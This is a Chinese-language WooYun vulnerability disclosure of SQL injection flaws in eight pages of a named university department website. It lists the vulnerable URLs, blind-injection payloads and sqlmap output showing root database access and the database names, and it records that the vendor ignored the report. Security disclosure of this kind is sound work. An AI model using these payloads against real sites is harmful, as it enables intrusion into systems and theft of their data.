wybug_title: 机械与汽车工程学院SQL注入Root权限(附带八处)
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail: 漏洞详情 披露状态：   									2015-01-14：	细节已通知厂商并且等待厂商处理中									2015-01-19：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： SQL注入 详细说明：  SQL注入！   漏洞证明：  注入:http://jdx.zjweu.edu.cn:8080/department.php?id=3http://jdx.zjweu.edu.cn:8080/party.php?id=32http://jdx.zjweu.edu.cn:8080/teach.php?id=8http://jdx.zjweu.edu.cn:8080/studyish.php?id=41http://jdx.zjweu.edu.cn:8080/job.php?id=48http://jdx.zjweu.edu.cn:8080/departments.php?id=56http://jdx.zjweu.edu.cn:8080/article_content.php?id=641http://jdx.zjweu.edu.cn:8080/partys.php?id=73测试如下:sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=3' AND 8503=8503 AND 'poCo'='poCo    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=3' AND SLEEP(5) AND 'ZGay'='ZGay---[15:40:00] [INFO] the back-end DBMS is MySQLweb server operating system: Windowsweb application technology: PHP 5.3.1, Apache 2.2.15back-end DBMS: MySQL 5.0.11[15:40:00] [INFO] fetched data logged to text files under 'C:\Documents and Settings\Administrator\.sqlmap\output\jdx.zjweu.edu.cn'[*] shutting down at 15:40:00current user:    'root@localhost'current database:    'ajidianxi'available databases [4]:[*] ajidianxi[*] information_schema[*] mysql[*] test   修复方案：  过滤！   版权声明：转载请注明来源 YuShen@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-01-19 14:02 厂商回复：  最新状态： 暂无
